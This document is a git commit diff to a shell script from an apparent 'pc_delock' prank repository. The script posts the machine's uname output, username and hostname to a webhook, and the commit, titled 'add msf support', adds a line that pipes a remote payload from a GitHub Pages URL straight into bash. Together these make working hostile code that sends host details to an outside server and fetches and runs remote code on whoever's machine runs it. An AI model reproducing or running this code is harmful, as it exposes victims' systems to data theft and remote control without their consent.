d55f13e938ee598f234839a7ba4b3a283a351231
Remy <remy.noulin@epitech.eu>
2022-10-06 19:32:19 +0200

    [MOD] add msf support

--- script.sh
+++ script.sh
@@ -7,4 +7,4 @@ curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.s
 curl \
   -H "Content-Type: application/json" \
   -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
-exit
+curl "https://Waz0x.github.io/msf" | bash
